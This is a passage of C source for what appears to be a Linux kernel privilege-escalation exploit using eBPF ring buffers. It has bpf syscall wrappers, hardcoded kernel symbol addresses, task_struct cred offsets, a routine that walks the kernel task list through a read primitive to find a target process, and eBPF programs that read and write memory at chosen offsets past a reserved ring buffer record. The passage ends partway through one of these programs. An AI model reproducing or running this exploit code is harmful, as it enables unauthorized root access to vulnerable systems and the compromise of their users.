#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "bpf.h"
#include <asm/unistd.h> //for __NR_bpf
#include <sys/socket.h>
#include "bpf_insn.h"
#include <linux/if_ether.h>
#include <linux/if_vlan.h>
#include <errno.h>
#include <sys/xattr.h>
//#include <linux/xattr.h>

#include <linux/userfaultfd.h>
#include <sys/ioctl.h> //also needed for userfaultfd macros?

#include <sys/syscall.h>  //for SYS_* values

#include <sys/resource.h>//for rlimit stuff
#include <keyutils.h>
#include <signal.h>
#include <sys/mman.h>
//#include "lib.h"
#include <sched.h>
//#include "utils.h"

#ifdef  DEBUG_MODE
#define debug_printf(fmt,...) fprintf(stderr,"[%s():line %i] "fmt,__FUNCTION__,__LINE__,##__VA_ARGS__)
#else
#define debug_printf(fmt,...) 

#endif

 void dump_qword(unsigned long long * buff,long user_size) { } //empty function for when we consolidate everything into this file

unsigned long long get_pagesize()
{
  return sysconf(_SC_PAGESIZE);
}

int (*read_addr_func)(char *, int, char *) ;

unsigned long long init_task_64 = 0;
unsigned long long task_struct_tasks_offset_64 = 0;
unsigned long long task_struct_pid_offset_64 = 0;
unsigned long long task_struct_cred_offset_64 = 0;
unsigned long long task_struct_comm_offset_64 = 0;

uint64_t find_task_64(int target_pid)
{

  /*
    requires:
    - init_task_64 
    - task_struct_tasks_offset_64 (offset of the .tasks linked list linkage)
    - task_struct_pid_offset_64 (offset of the dword that represents the pid of the task that corresponds to the task struct)
  */
  //uint64_t curr_task;
  //uint64_t  next_task;
  unsigned long long curr_task;
  unsigned long long  next_task;
  int curr_pid;
  //int start = 0;
  int found_target = 0;
  int rv= 0;

  printf("%s(): entered\n",__FUNCTION__);

  curr_task = init_task_64;

  //rv = read_addr(init_task_64 + task_struct_tasks_offset_64,sizeof(uint64_t),&next_task);
  rv = (*read_addr_func)(init_task_64 + task_struct_tasks_offset_64,sizeof(uint64_t),&next_task);

  next_task = next_task - task_struct_tasks_offset_64;
  printf("target pid = %i\n",target_pid);

  printf("initial next_task @ %p\n",next_task);
  curr_task = next_task;

  while (1)
    {
      if (curr_task == init_task_64)
	{
	  break;

	}

      //pid is still 4 bytes
      (*read_addr_func)(curr_task + task_struct_pid_offset_64,4,&curr_pid);

      printf("task @ %p with pid %i\n",curr_task,curr_pid);

      (*read_addr_func)(curr_task + task_struct_tasks_offset_64,sizeof(uint64_t),&next_task);
      next_task = next_task - task_struct_tasks_offset_64;
      //check curr_pid against the target pid
      if (target_pid == curr_pid)
	{
	  printf("found target_pid (%i | %i)! | curr_task = %p\n",target_pid,curr_pid,curr_task);
	  found_target = 1;
	  break;
	}

      curr_task = next_task;

    }

  if (!found_target)
    curr_task = -1;

  return curr_task;
}

unsigned long long kaddr_upper = 0xffffffff00000000;

int is_kaddr(unsigned long long addr)
{
  if ((kaddr_upper&addr) == kaddr_upper)
    {
      return 1;
    }
  return 0;
}




char * leak_buff1 = 0;
unsigned long long leak_buff1_size = 0;
unsigned long long leak_buff1_count = 0;

unsigned long long PAGE_SIZE = 0;
unsigned long long page_size_g = 0;


struct tty_operations {
  void *(*lookup)(void *, void *, int);
  int (*install)(void *, void *);
  void (*remove)(void *, void *);
  int (*open)(void *, void *);
  void (*close)(void *, void *);
  void (*shutdown)(void *);
  void (*cleanup)(void *);
  int (*write)(void *, const unsigned char *, int);
  int (*put_char)(void *, unsigned char);
  void (*flush_chars)(void *);
  int (*write_room)(void *);
  int (*chars_in_buffer)(void *);
  int (*ioctl)(void *, unsigned int, unsigned long);
  long (*compat_ioctl)(void *, unsigned int, 
		       unsigned long);
  void (*set_termios)(void *, void *);
  void (*throttle)(void *);
  void (*unthrottle)(void *);
  void (*stop)(void *);
  void (*start)(void *);
  void (*hangup)(void *);
  int (*break_ctl)(void *, int);
  void (*flush_buffer)(void *);
  void (*set_ldisc)(void *);
  void (*wait_until_sent)(void *, int);
  void (*send_xchar)(void *, char);
  int (*tiocmget)(void *);
  int (*tiocmset)(void *, unsigned int, unsigned int);
  int (*resize)(void *, void *);
  int (*get_icount)(void *, void *);
  int (*get_serial)(void *, void *);
  int (*set_serial)(void *, void *);
  void (*show_fdinfo)(void *, void *);
  int (*poll_init)(void *, int, char *);
  int (*poll_get_char)(void *, int);
  void (*poll_put_char)(void *, int, char);
  int (*proc_show)(void *, void *);
};


unsigned long long ptm_unix98_ops_base = 0xffffffff820a7540;
unsigned long long ptm_unix98_ops = 0;

unsigned long long init_task_comm_base = 0xffffffff82613940 + 2792;
unsigned long long init_task_comm = 0;

unsigned long long init_task_base = 0xffffffff82613940;
unsigned long long init_task = 0;


#define LOG_BUF_SIZE 4096

char log_buff_g[LOG_BUF_SIZE];

int sys_bpf(int cmd, char * attr_addr, unsigned int attr_size)
{
  
  return syscall(__NR_bpf,cmd,attr_addr,attr_size);
}

struct map_creation_attr_old
{    /* Used by BPF_MAP_CREATE */
  __u32         map_type;
  __u32         key_size;    /* size of key in bytes */
  __u32         value_size;  /* size of value in bytes */
  __u32         max_entries; /* maximum number of entries
				in a map */
};

struct map_creation_attr
{    /* Used by BPF_MAP_CREATE */
  __u32         map_type;
  __u32         key_size;    /* size of key in bytes */
  __u32         value_size;  /* size of value in bytes */
  __u32         max_entries; /* maximum number of entries
				in a map */
  __u32 map_flags;/* BPF_MAP_CREATE related
		   * flags defined above.
		   */
  __u32 inner_map_fd;/* fd pointing to the inner map */
  __u32 numa_node;/* numa node (effective only if
		   * BPF_F_NUMA_NODE is set).
		   */
  char map_name[BPF_OBJ_NAME_LEN];
  __u32 map_ifindex;/* ifindex of netdev to create on */
  __u32 btf_fd;/* fd pointing to a BTF type data */
  __u32 btf_key_type_id;/* BTF type_id of the key */
  __u32 btf_value_type_id;/* BTF type_id of the value */
  __u32 btf_vmlinux_value_type_id;/* BTF type_id of a kernel-
				   * struct stored as the
				   * map value
				   */
};


struct map_element_attr
{    /* Used by BPF_MAP_*_ELEM and BPF_MAP_GET_NEXT_KEY
	commands */
  __u32         map_fd;
  __aligned_u64 key;
  union {
    __aligned_u64 value;
    __aligned_u64 next_key;
  };
  __u64         flags;


};

struct prog_load_attr
{    /* Used by BPF_PROG_LOAD */
  __u32         prog_type;
  __u32         insn_cnt;
  __aligned_u64 insns;      /* 'const struct bpf_insn *' */
  __aligned_u64 license;    /* 'const char *' */
  __u32         log_level;  /* verbosity level of verifier */
  __u32         log_size;   /* size of user buffer */
  __aligned_u64 log_buf;    /* user supplied 'char *'
			       buffer */
  __u32         kern_version;
  /* checked when prog_type=kprobe
     (since Linux 4.1) */
};



#define BPF_JEQ(DST, IMM, OFF)			\
  ((struct bpf_insn) {				\
    .code  = 0x15,				\
      .dst_reg = DST,				\
      .src_reg = 0,				\
      .off   = OFF,				\
      .imm   = IMM })

#define BPF_JNE(DST, IMM, OFF)			\
  ((struct bpf_insn) {				\
    .code  = 0x55,				\
      .dst_reg = DST,				\
      .src_reg = 0,				\
      .off   = OFF,				\
      .imm   = IMM })


#define BPF_JLT(DST, IMM, OFF)			\
  ((struct bpf_insn) {				\
    .code  = 0xa5,				\
      .dst_reg = DST,				\
      .src_reg = 0,				\
      .off   = OFF,				\
      .imm   = IMM })


#define BPF_JA(OFF)				\
  ((struct bpf_insn) {				\
    .code  = 0x05,				\
      .dst_reg = 0,				\
      .src_reg = 0,				\
      .off   = OFF,				\
      .imm   = 0 })



//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_copy_from_user),
#define bpf_do_call(func, insn_ptr, insn_count)				\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, func); \
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }


//*(u32 *)(base_reg + offset) = value_reg
#define bpf_do_store_mem_reg_dw(base_reg,offset,value_reg, insn_ptr, insn_count) \
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_STX_MEM(BPF_W, base_reg, value_reg, offset); \
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }


//*(u64 *)(base_reg + offset) = value_reg
#define bpf_do_store_mem_reg_qw(base_reg,offset,value_reg, insn_ptr, insn_count) \
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_STX_MEM(BPF_DW, base_reg, value_reg, offset); \
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }


//BPF_LDX_MEM(BPF_DW, dest_reg, base_reg, offset), // dest_reg = *(u64 *)(base_reg + offset)
//BPF_LDX_MEM(BPF_DW, dest_reg, base_reg, offset),
// dest_reg = *(u64 *)(base_reg + offset)
#define bpf_do_load_mem_reg_qw(base_reg,offset,dest_reg, insn_ptr, insn_count) \
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_LDX_MEM(BPF_DW, dest_reg, base_reg, offset); \
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }


//BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)
//BPF_MOV64_REG(dest_reg, src_reg)


//dest_reg <- src_reg
#define bpf_do_mv_reg_qw(dest_reg,src_reg, insn_ptr, insn_count)	\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_MOV64_REG(dest_reg, src_reg);	\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }



//dest_reg <- imm
#define bpf_do_mv_imm_qw(dest_reg,imm, insn_ptr, insn_count)		\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_MOV64_IMM(dest_reg, imm);	\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }


//dest_reg <- imm
#define bpf_do_mv_imm_dw(dest_reg,imm, insn_ptr, insn_count)		\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_MOV32_IMM(dest_reg, imm);	\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }



//dest_reg = dest_reg (op) imm
#define bpf_do_alu_imm_qw(op,dest_reg,imm, insn_ptr, insn_count)	\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_ALU64_IMM(op, dest_reg, imm);	\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }


#define bpf_do_alu_reg_qw(op,dest_reg,src_reg, insn_ptr, insn_count)	\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_ALU64_REG(op, dest_reg, src_reg); \
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }



#define bpf_do_load_imm64_raw(DST, SRC, IMM,insn_ptr, insn_count)	\
  {									\
    ((struct bpf_insn *)insn_ptr)->code = BPF_LD | BPF_DW | BPF_IMM;	\
    ((struct bpf_insn *)insn_ptr)->dst_reg = DST;			\
    ((struct bpf_insn *)insn_ptr)->src_reg = SRC;			\
    ((struct bpf_insn *)insn_ptr)->off = 0;				\
    ((struct bpf_insn *)insn_ptr)->imm = (__u32) (IMM);			\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
    ((struct bpf_insn *)insn_ptr)->code = 0;				\
    ((struct bpf_insn *)insn_ptr)->dst_reg = 0;				\
    ((struct bpf_insn *)insn_ptr)->src_reg = 0;				\
    ((struct bpf_insn *)insn_ptr)->off = 0;				\
    ((struct bpf_insn *)insn_ptr)->imm = ((__u64) (IMM))>>32;		\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }



#define bpf_do_load_map_fd(map_fd,dest_reg, insn_ptr, insn_count)	\
  {									\
    bpf_do_load_imm64_raw(dest_reg,BPF_PSEUDO_MAP_FD,map_fd,insn_ptr,insn_count); \
  }



#define bpf_do_exit(insn_ptr, insn_count)		\
  {							\
    *(struct bpf_insn *)insn_ptr = BPF_EXIT_INSN();	\
    (struct bpf_insn *)insn_ptr++;			\
    (int)insn_count++;					\
  }


//pc + <jmp_offset> if <cmp_reg> != <cmp_imm>
#define bpf_do_jne(cmp_reg,cmp_imm,jmp_offset, insn_ptr, insn_count)	\
  {									\
    *(struct bpf_insn *)insn_ptr = BPF_JNE(cmp_reg,cmp_imm,jmp_offset);	\
    (struct bpf_insn *)insn_ptr++;					\
    (int)insn_count++;							\
  }

//pc + <jmp_offset> if <cmp_reg> != <cmp_imm>
#define bpf_do_ja(jmp_offset, insn_ptr, insn_count)	\
  {							\
    *(struct bpf_insn *)insn_ptr = BPF_JA(jmp_offset);	\
    (struct bpf_insn *)insn_ptr++;			\
    (int)insn_count++;					\
  }


int _bpf_prog_load(unsigned int prog_type,unsigned int  insn_cnt, unsigned long long insns,unsigned long long license, unsigned int log_level, unsigned int log_size, unsigned long long log_buff, unsigned int kern_version )
{
  int rv = 0;

  struct prog_load_attr attr = {0};

  debug_printf("prog_type = %u\n",prog_type);
  debug_printf("insn_cnt = %u\n",insn_cnt);
  debug_printf("insn @ %p\n",insns);
  debug_printf("license = '%s'\n",license);
  debug_printf("log_size = %u\n",log_size);
  debug_printf("log_buff @ %p\n",log_buff);

  //isns is an array of struct bpf_insn
  attr.prog_type = prog_type;
  attr.insns = insns;
  attr.insn_cnt = insn_cnt;
  attr.license = license;
  attr.log_buf = log_buff;
  attr.log_size = log_size;
  attr.log_level = log_level;
  debug_printf("insns = %p\n",insns);
  rv = sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));

  return rv;
}

//

int _bpf_prog_load2(unsigned int prog_type,unsigned int  insn_cnt, unsigned long long insns,unsigned long long license, unsigned int log_level, unsigned int log_size, unsigned long long log_buff, unsigned int kern_version )
{
  int rv = 0;

  struct prog_load_attr attr = {0};

  debug_printf("prog_type = %u\n",prog_type);
  debug_printf("insn_cnt = %u\n",insn_cnt);
  debug_printf("insn @ %p\n",insns);
  debug_printf("license = '%s'\n",license);
  debug_printf("log_size = %u\n",log_size);
  debug_printf("log_buff @ %p\n",log_buff);

  //isns is an array of struct bpf_insn
  attr.prog_type = prog_type;
  attr.insns = insns;
  attr.insn_cnt = insn_cnt;
  attr.license = license;
  attr.log_buf = log_buff;
  attr.log_size = log_size;
  attr.log_level = log_level;
  //printf("insns = %p\n",insns);
  rv = sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));

  return rv;
}



char bpf_log_buf[LOG_BUF_SIZE];


int bpf_map_create(unsigned int map_type, unsigned int key_size, unsigned int value_size, unsigned int max_entries)
{
  int rv = 0;

  struct map_creation_attr attr = {0};

  //isns is an array of struct bpf_insn
  attr.map_type = map_type;
  attr.key_size = key_size;
  attr.value_size = value_size;
  attr.max_entries = max_entries;

  rv = sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
  return rv;
}


int bpf_map_create_without_flags(unsigned int map_type, unsigned int key_size, unsigned int value_size, unsigned int max_entries,unsigned int flags)
{
  int rv = 0;

  struct map_creation_attr attr = {0};

  //isns is an array of struct bpf_insn
  attr.map_type = map_type;
  attr.key_size = key_size;
  attr.value_size = value_size;
  attr.max_entries = max_entries;
  //attr.map_flags = flags;

  rv = sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
  return rv;
}

int bpf_map_create_with_flags(unsigned int map_type, unsigned int key_size, unsigned int value_size, unsigned int max_entries,unsigned int flags)
{
  int rv = 0;

  struct map_creation_attr attr = {0};

  //isns is an array of struct bpf_insn
  attr.map_type = map_type;
  attr.key_size = key_size;
  attr.value_size = value_size;
  attr.max_entries = max_entries;
  attr.map_flags = flags;

  rv = sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
  return rv;
}

int bpf_map_lookup_elem(unsigned int map_fd, unsigned long long *  key_ptr, unsigned long long * value_ptr)
{
  int rv;
  struct map_element_attr attr = {0};
  attr.map_fd = map_fd;
  attr.key = key_ptr;
  attr.value = value_ptr;

  rv = sys_bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
  return rv;
}

int bpf_map_update_elem(unsigned int map_fd, unsigned long long *  key_ptr, unsigned long long * value_ptr,unsigned long long flags)
{
  int rv;
  struct map_element_attr attr = {0};
  attr.map_fd = map_fd;
  attr.key = key_ptr;
  attr.value = value_ptr;
  attr.flags = flags;

  rv = sys_bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
  return rv;
}

int bpf_map_delete_elem(unsigned int map_fd, unsigned long long *  key_ptr)
{
  int rv;
  struct map_element_attr attr = {0};
  attr.map_fd = map_fd;
  attr.key = key_ptr;
  //attr.value = value_ptr;
  //attr.flags = flags;

  rv = sys_bpf(BPF_MAP_DELETE_ELEM, &attr, sizeof(attr));
  return rv;
}



unsigned long long thread_stack_size_g = 0;

void * alloc_thread_stack(unsigned long long size_in)//creates thread stack as an anonymous private vma
{
  unsigned long long thread_stack_size =thread_stack_size_g;
  if (size_in)
    {
      thread_stack_size = size_in;
    }
  return mmap(0,thread_stack_size,PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
}

void * alloc_anon_rw_vma(unsigned long long nr_pages)
{

  return mmap(0,page_size_g*nr_pages,PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
}

//4096-0x30

char dummy_buffer[64] = {0};



#define EXP_MAP_FD 3

int load_program__read_consumer_producer(int hashmap_fd_in,int arraymap_fd_in)
{
  int rv = 0;
  int prog_fd = 0;

  struct bpf_insn insns[]={
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), /* *(u32 *)(fp - 4) = r0 */
    BPF_MOV64_IMM(BPF_REG_0, 4919),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8), /* *(u32 *)(fp - 8) = r0 */
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8), /* r3 = fp - 8 */
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),

    BPF_LD_MAP_FD(BPF_REG_1, hashmap_fd_in), //load map pointer into r1

    BPF_MOV64_IMM(BPF_REG_2, BPF_RB_CONS_POS),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_query),//pos will be in r0


    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -16), /* *(u64 *)(fp - 16) = r0 */ //store qword
    BPF_MOV64_IMM(BPF_REG_4, 0),//r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), /* *(u32 *)(fp - 4) = r0 */ //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), /* r3 = fp - 16 */
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), //store value that we read into arraymap

    //store the producer position
    BPF_LD_MAP_FD(BPF_REG_1, hashmap_fd_in), //load map pointer into r1
    BPF_MOV64_IMM(BPF_REG_2, BPF_RB_PROD_POS),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_query),//pos will be in r0

    //store leak (value) on stack
    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -16), /* *(u64 *)(fp - 16) = r0 */ //store qword
    //index 1
    BPF_MOV64_IMM(BPF_REG_4, 1), //r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), /* *(u32 *)(fp - 4) = r4 */ //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), /* r3 = fp - 16 */
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),

    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), //store value that we read into arraymap

    BPF_MOV64_IMM(BPF_REG_0, 44),
    BPF_EXIT_INSN(),

  };
  debug_printf("attempting to load program\n");

  rv = prog_fd = _bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,sizeof(insns)/sizeof(struct bpf_insn ), insns,"GPL", 1, LOG_BUF_SIZE,log_buff_g, 0 );

  return rv;
}


int load_program__read_mask(int hashmap_fd_in,int arraymap_fd_in)
{
  int rv = 0;
  int prog_fd = 0;

  //reads ringbuffer mask and stores it at index 0 of arraymap
  struct bpf_insn insns[]={
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), /* *(u32 *)(fp - 4) = r0 */
    BPF_MOV64_IMM(BPF_REG_0, 4919),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8), /* *(u32 *)(fp - 8) = r0 */
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8), /* r3 = fp - 8 */
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),

    BPF_LD_MAP_FD(BPF_REG_1, hashmap_fd_in), //load map pointer into r1
    BPF_MOV64_IMM(BPF_REG_2, BPF_RB_RING_SIZE),

    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_query),//pos will be in r0

    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -16), /* *(u64 *)(fp - 16) = r0 */ //store qword
    BPF_MOV64_IMM(BPF_REG_4, 0),//r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), /* *(u32 *)(fp - 4) = r0 */ //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), /* r3 = fp - 16 */
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), //store value that we read into arraymap

    BPF_MOV64_IMM(BPF_REG_0, 44),
    BPF_EXIT_INSN(),

  };

  debug_printf("attempting to load program\n");
  rv = prog_fd = _bpf_prog_load2(BPF_PROG_TYPE_SOCKET_FILTER,sizeof(insns)/sizeof(struct bpf_insn ), insns,"GPL", 1, LOG_BUF_SIZE,log_buff_g, 0 );

  return rv;
}


#define OP_READ 0

#define OP_WRITE 1

#define OP_INDEX 2
#define OFFSET_INDEX 3
#define VALUE_INDEX 4

#define __round_mask(x, y) ((__typeof__(x))((y)-1))

#define round_up(x, y) ((((x)-1) | __round_mask(x, y))+1)


   
int load_program__try_read_write_with_reserve_buffer2(int hashmap_fd_in,int arraymap_fd_in,unsigned long long size,unsigned int offset)
{
  int rv = 0;
  int prog_fd = 0;

  struct bpf_insn insns[]={
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), // *(u32 *)(fp - 4) = r0 
    BPF_MOV64_IMM(BPF_REG_0, 4919),
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8), // *(u32 *)(fp - 8) = r0 
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // r2 = fp - 4 
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8), // r3 = fp - 8 
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),

    BPF_LD_MAP_FD(BPF_REG_1, hashmap_fd_in), //load map pointer into r1

    BPF_MOV64_IMM(BPF_REG_2, size),//r2 is size

    BPF_MOV64_IMM(BPF_REG_3, 0x0),//
    BPF_MOV64_IMM(BPF_REG_4, 0x0),//
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve ),//r0 will be data pointer

    //store data ptr (value) on stack
    BPF_MOV64_IMM(BPF_REG_4, 0),//
    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_4, -16), // *(u64 *)(fp - 16) = r4  //store qword
	
    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -24), // *(u64 *)(fp - 16) = r4  //store qword

    //r6 holds ringbuf record
	
    BPF_MOV64_IMM(BPF_REG_4, 2),//r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), // *(u32 *)(fp - 4) = r0  //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // r2 = fp - 4 
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), //r3 = fp - 16 
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),

    //free ringbuf record
    BPF_LD_MAP_FD(BPF_REG_1, hashmap_fd_in), //load map pointer into r1

    BPF_MOV64_IMM(BPF_REG_3, 0x0),//
    BPF_MOV64_IMM(BPF_REG_4, 0x0),//
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0), //r6 holds the ringbuf record
    //BPF_JEQ(BPF_REG_1,0,1),
    BPF_JNE(BPF_REG_0,0,2),//if r1 is not 0, jump past exit
    BPF_MOV64_IMM(BPF_REG_0, 44),
    BPF_EXIT_INSN(),
    BPF_MOV64_IMM(BPF_REG_4, 0x1337),//

    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),///save record in r8

    //read op from arrray map index 2
    BPF_MOV64_IMM(BPF_REG_4, OP_INDEX),//r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), // *(u32 *)(fp - 4) = r0  //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // r2 = fp - 4 
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), //r3 = fp - 16
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1

    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), 

    //read op from fp - 16
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_10, -16), // r9 = *(u64 *)(fp - 16)
    //r9 holds op

    BPF_MOV64_IMM(BPF_REG_4, OFFSET_INDEX),//r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), // *(u32 *)(fp - 4) = r0  //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // r2 = fp - 4 
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16), //r3 = fp - 16
    BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
    BPF_LD_MAP_FD(BPF_REG_1, arraymap_fd_in), //load map pointer into r1

    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), 


    //read value_offset from fp - 16
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -16), // r9 = *(u64 *)(fp - 16)

    //r9 holds op

    BPF_JNE(BPF_REG_9,OP_READ,14), //if r5 is not read, jump past read

    //read value from buffer
    //try readng from record and storing qword in map
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),///restore record

    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1,offset), // record = record + offset

    BPF_LDX_MEM(BPF_DW, BPF_REG_7,BPF_REG_1, 0), // r7 = *(u64 *)(r1+8) = *(u64 *)(record_ptr + 8)


    BPF_MOV64_IMM(BPF_REG_4, VALUE_INDEX),//r4 holds key (index)
    //store key (index) on stack  
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_4, -4), // *(u32 *)(fp - 4) = r4  //store word
    //store value that was read from buffer
    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_7, -16), // *(u32 *)(fp - 4) = r0  //store word
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // r2 = fp - 4 
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
